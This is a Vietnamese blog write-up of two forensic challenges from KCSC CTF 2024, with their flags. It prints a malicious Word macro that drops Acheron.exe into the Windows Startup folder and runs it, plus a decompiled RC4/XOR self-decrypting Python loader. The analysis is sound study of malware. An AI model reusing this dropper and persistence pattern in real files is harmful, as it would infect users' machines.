---
layout: post
title: KCSC CTF 2024 - Forensic
description: Command and Control server problem
tags: [KCSC, Writeup, Forensic, DFIR]
---

Hello cả nhà, đợt vừa rồi mình được 1 anh trai siêu tốt bụng cho mượn nick để chơi KCSC CTF 2024 và rất may mắn là mình đã giải được 2/3 forensic challenges của họ, nên hôm nay mình muốn viết writeup tất cả những bài mình giải được. Đây là năm đầu tiên mình có cơ hội tham gia giải CTF của ngôi trường mà mình đã trượt hồi thi đại học 😔😔😔, tham gia để học hỏi là chính thui. Thui, bắt đầu nha!

### Externet Inplorer

Bài cho chúng ta 1 đường link và yêu cầu chúng ta tìm timestamp của nó khi được search. Challenge này khá là dễ, các bạn chỉ cần sử dụng [tool](https://dfir.blog/unfurl/) là ra nha :3 

**Flag: KCSC{2023-09-18_08:32:22.547027}**

### Jumper In Disguise

Sample của chúng ta là 1 file .docm và chúng ta phải điều tra xem nó có thực sự độc hại hay không. Với những bài dạng kiểu này, mình luôn để ý đến VBA code - những dòng code phụ trách 
việc thực thi các tác vụ tự động, và kẻ xấu có thể chỉnh sửa đoạn code này cho mục đích xấu

Đầu tiên, mình sử dụng **olevba.py** để extract toàn bộ VBA code:

<details>
<summary>
	VBA code nè
</summary>
	
```
Function zzz(troll As String) As String
    Dim aaa As String
    Dim bbb As String
    Dim ccc As String
    Dim i As Integer
    aaa = ""
    For i = 1 To Len(troll) Step 2
        aaa = aaa & ChrW("&H" & Mid(troll, i, 2))
    Next i
    bbb = "4444"
    ccc = ""
    For i = 1 To Len(aaa)
        ccc = ccc & ChrW(AscW(Mid(aaa, i, 1)) Xor AscW(Mid(bbb, (i - 1) Mod Len(bbb) + 1, 1)))
    Next i
    
    zzz = ccc
End Function
Sub AutoOpen()
    MsgBox "YOU GOT BONKED"
    MsgBox "KCSC{Keep_findin_till_reveal_secret}"
    Dim troll As String
    Dim nifal As String
    troll = "7a4a5c4245565a1742525a435058461b11405b5844575c421140525c4440565911595a5c5a5c46161012"
    nifal = zzz(troll)


Dim luachua
Dim file_length As Long
Dim length As Long
file_length = FileLen(ActiveDocument.FullName)
luachua = FreeFile
Open (ActiveDocument.FullName) For Binary As #luachua
Dim lem() As Byte
ReDim lem(file_length)
Get #luachua, 1, lem
Dim eee As String
eee = StrConv(lem, vbUnicode)
Dim fff, rrr
Dim nbv
    Set nbv = CreateObject("vbscript.regexp")
    nbv.Pattern = "SUPERNOVAOVERLOAD"
    Set rrr = nbv.Execute(eee)
Dim idx

For Each fff In rrr
idx = fff.FirstIndex
Exit For
Next

En = Environ("appdata") & "\Microsoft\Windows\Start Menu\Programs\Startup"
Set fszzzzz = CreateObject("Scripting.FileSystemObject")
Dim wakuwaku() As Byte
Dim soj As Long
soj = 4296810
ReDim wakuwaku(soj)
Get #luachua, idx + 18, wakuwaku
Dim bruh
bruh = FreeFile
deced = wakuwaku

Dim mei() As Byte
mei = deced
bbb = "4444"
For i = 1 To (soj + 1)
    jdj = deced(i - 1) Xor AscW(Mid(bbb, (i - 1) Mod Len(bbb) + 1, 1))
    mei(i - 1) = jdj
    Next i

namae = En & "\" & "Acheron.exe"
Open (namae) For Binary As #bruh
Put #bruh, 1, mei

Close #bruh
Erase wakuwaku
Set ceo = CreateObject("WScript.Shell")
ceo.Run """" + namae + """" + nifal
ActiveDocument.Save
End Sub
```
</details>

Mình sẽ đi sơ qua về các function trong đống VBA này nha: 
- Với zzz() chúng ta có ba biến là aaa, bbb, ccc với aaa là kết quả của troll sau khi được tách ra thành các byte riêng biệt, bbb có giá trị là 1337 (các bạn có thể thấy ở trên là 4444 nhưng khi mình mở file lần nữa thì nó là 1337, khum biết nó là kĩ thuật gì nhưng mà thực sự nhìn cũng hay hay 😊😊😊) và ccc chính là kết quả sau khi xor chuỗi aaa với key là 1337. Đến đây mình viết luôn script nho nhỏ để decode xem nó ra cái gì:

![image](https://github.com/odintheprotector/KCSC-CTF-2024/assets/75618225/67c13a9d-7333-4164-b03f-352b4ad8b6ae)

- Oke, chúng ta có một câu gì đó tớ cũng lười translate lắm, cứ nhớ nó đã nha. Tiếp theo chúng ta sẽ phân tích tiếp đoạn đằng sau và khúc mình để ý nhất đó là khúc VBA sẽ drop 1 file tên là **Acheron.exe**. Cụ thể hơn, để ý ở dòng có chuỗi SUPERNOVAOVERLOAD, nó sẽ lấy chuỗi này làm mốc sau đó lấy 4296810 bytes đằng sau -> lưu vào biến deced, sau đó deced lại được đem đi XOR 1 lần nữa và data sẽ được lưu thành file exe như chúng ta thấy. Ban đầu mình có viết code để extract nó ra nhưng mà không thành, đâm ra mình lười và buộc phải chạy file để lấy file exe đó về 😊😊 (chạy file mà cái def nó pop up đến ná thở lun) và rất may là mình đã lấy được file đó về UwU:

![image](https://github.com/odintheprotector/KCSC-CTF-2024/assets/75618225/56b4f3b5-c99a-4a97-a7a1-bc618dec731c)

Mình lại upload file này lên Virustotal =))) và mình thấy rằng file exe được pack bằng pyinstaller. Từ đây mình dễ dàng unpack nó bằng [pyinsextractor](https://github.com/extremecoders-re/pyinstxtractor):

![image](https://github.com/odintheprotector/KCSC-CTF-2024/assets/75618225/ce98c078-56cf-4307-83a9-773117f5828d)

Ta có thể thấy lmao.pyc là file đáng nghi nhất, và đến đây mình sử dụng [uncompyle6](https://pypi.org/project/uncompyle6/) để decompile nó, và đây là output của nó: 

```
"""nR9aRuepXAGTojNrgfy3ai8iY5vq86RrJVwkOPRl5ne9vqd2b38dWd650pxpK/OMwkl1qcOeY/Bf+GYqKR7UG/0stVv2AfMjCYyb9CGSnZHqeaXLEd/2rhrni1+oyqqKuuQbawVTNY7ZcFJqejDjyw+1i2TSCgTuj1N7RZb9paxVlWZ/xLxz8pxrfhdtStZPVflTB24X1yQ/mZNfYWepk2zblSmsnq6sPRGr+50EeB0E+1j1igDuVTv0Ym1cS45QNMymjP0hFY5DjvR0W0EraJdEoXR6dQvgBPKSwdJ0JI87iPkesR3M7I77mtKtmNv5ydm3eo5TYzmbnXL42rZnLrhmgmNFzXa3gDYxnYBtmzgLTB3PQ3qVnSPVI2mr1GD7hCLQDeHm1HFEwx3dPvBwKhLSWqQw7Crw37OTaJCYOCLDlPzE1GZc2sOITPq2xckalHsjzXJMZ83u4FPSW31LS4hvdLb1LNl6vOgEMkUgaGqtfVO7AHPMwHFY7wO+1ggzJubH1MlX3UAtqS8DtskzeeSrHaS1GNyr5Pp6cVbUJLqSREHrmqJ/pi/3637Fyjsj374laynjrsJA8txeUD5GoNVIgB82rftGPNE6JR46JnBx0o8koHkXuKySWrPGkPV/IS2tZIb0O9qinGRQWI/hxm5q1qPVloqtVn644DVaeM9K4NGCU6VS2YDhEMlADOht5T3U2KbfoQD9HPta5W82HfaKv2/yJs+UfVd9xKfTQ/k4q3ob9nVupqiwTNgPWgaHPS36LZtGL3lEQTLaNRX3BQVDGuFY4s3RZQk/Oq9MkD5ZUVQlEJCQDezT40pbvWJRn+2OaKZizb3fbnKM0ggUbDKEU1gsI2OPrdqq3W/8Zel5NwC/7fdhiL+2zuO58JamssKdTc7e8CcwKhVRBFGs6Q0uYCx+VKXgnO7dn+ojW6RiQGeDb6w4IufhEvJxH56fgWcO52ZnvhOYymHKtztJSWLDn5H6hyEvCS48UPFW3SrCqxOXVadzcl4OOJkOoRBQ09PRfJd1mN92rF0kH23AyRvJWjQXXJ78uxeNoaRDmK6zDPS1R0LR40J0dPwJGnZYEeWyPw=="""
import sys
from base64 import b64decode as d

S = [i for i in range(256)]
j = 0
out = []
for i in range(256):
    j = (j + S[i] + ord(sys.argv[1][(i % len(sys.argv[1]))])) % 256
    S[i], S[j] = S[j], S[i]

i = j = 0
for char in d(globals()['__doc__']):
    i = (i + 1) % 256
    j = (j + S[i]) % 256
    S[i], S[j] = S[j], S[i]
    out.append(char ^ S[((S[i] + S[j]) % 256)])

exec(''.join([chr(out[i] ^ open(sys.argv[0], 'rb').read(4)[(i % 4)]) for i in range(len(out))]))
```

Phân tích code 1 chút, ta dễ dàng nhìn thấy từ 13 dòng đầu là thuật toán RC4, sau đó ở dòng cuối cùng ta có thuật toán XOR, vậy tức là chuỗi ở trên đầu là đã được mã hóa bằng RC4 và XOR, và ở đoạn code này mình đoán nó sẽ decrypt chuỗi dài dài kia và thực thi nó. Và ở đây mình cần 2 key: 1 key cho RC4 và 1 key cho XOR. Hơn nữa, khi mình upload file docm lên Virustotal, mình có thấy họ detect được **Acheron.exe** được thực thi với chuỗi mình decode được ban đầu, vậy chắc chắn đây là key cho RC4, còn XOR thì ta chỉ cần lấy 4 bytes đầu của file exe là xong. Mọi thứ đã có rùi, chỉnh script 1 tí là ra thui 😊: 

```
"""nR9aRuepXAGTojNrgfy3ai8iY5vq86RrJVwkOPRl5ne9vqd2b38dWd650pxpK/OMwkl1qcOeY/Bf+GYqKR7UG/0stVv2AfMjCYyb9CGSnZHqeaXLEd/2rhrni1+oyqqKuuQbawVTNY7ZcFJqejDjyw+1i2TSCgTuj1N7RZb9paxVlWZ/xLxz8pxrfhdtStZPVflTB24X1yQ/mZNfYWepk2zblSmsnq6sPRGr+50EeB0E+1j1igDuVTv0Ym1cS45QNMymjP0hFY5DjvR0W0EraJdEoXR6dQvgBPKSwdJ0JI87iPkesR3M7I77mtKtmNv5ydm3eo5TYzmbnXL42rZnLrhmgmNFzXa3gDYxnYBtmzgLTB3PQ3qVnSPVI2mr1GD7hCLQDeHm1HFEwx3dPvBwKhLSWqQw7Crw37OTaJCYOCLDlPzE1GZc2sOITPq2xckalHsjzXJMZ83u4FPSW31LS4hvdLb1LNl6vOgEMkUgaGqtfVO7AHPMwHFY7wO+1ggzJubH1MlX3UAtqS8DtskzeeSrHaS1GNyr5Pp6cVbUJLqSREHrmqJ/pi/3637Fyjsj374laynjrsJA8txeUD5GoNVIgB82rftGPNE6JR46JnBx0o8koHkXuKySWrPGkPV/IS2tZIb0O9qinGRQWI/hxm5q1qPVloqtVn644DVaeM9K4NGCU6VS2YDhEMlADOht5T3U2KbfoQD9HPta5W82HfaKv2/yJs+UfVd9xKfTQ/k4q3ob9nVupqiwTNgPWgaHPS36LZtGL3lEQTLaNRX3BQVDGuFY4s3RZQk/Oq9MkD5ZUVQlEJCQDezT40pbvWJRn+2OaKZizb3fbnKM0ggUbDKEU1gsI2OPrdqq3W/8Zel5NwC/7fdhiL+2zuO58JamssKdTc7e8CcwKhVRBFGs6Q0uYCx+VKXgnO7dn+ojW6RiQGeDb6w4IufhEvJxH56fgWcO52ZnvhOYymHKtztJSWLDn5H6hyEvCS48UPFW3SrCqxOXVadzcl4OOJkOoRBQ09PRfJd1mN92rF0kH23AyRvJWjQXXJ78uxeNoaRDmK6zDPS1R0LR40J0dPwJGnZYEeWyPw=="""
import sys
from base64 import b64decode as d

S = [i for i in range(256)]
j = 0
out = []
for i in range(256):
    j = (j + S[i] + ord(sys.argv[1][(i % len(sys.argv[1]))])) % 256
    S[i], S[j] = S[j], S[i]

i = j = 0
for char in d(globals()['__doc__']):
    i = (i + 1) % 256
    j = (j + S[i]) % 256
    S[i], S[j] = S[j], S[i]
    out.append(char ^ S[((S[i] + S[j]) % 256)])

print(''.join([chr(out[i] ^ [0x4D, 0x5A, 0x90, 0x00][(i % 4)]) for i in range(len(out))]))
```

```
python solve.py <ném chuỗi vô nè>
```

![image](https://github.com/odintheprotector/KCSC-CTF-2024/assets/75618225/39397cd9-4634-44cb-bfa2-bf0b3958f377)

**Flag: KCSC{I_@m_daStomp_dat_1z_4Ppr0/\ch1n9!}**

Cảm ơn các bạn đã xem, mình chơi forensic là chủ yếu nên là có giải nào có forensic là mình phải chơi cho bằng được 😊. Cảm ơn KCSC đã tổ chức 1 cuộc thi hay và gay cấn đến như vậy!!!! Bye bye, hẹn mọi người ở writeup tiếp theo nha 😊😊😊



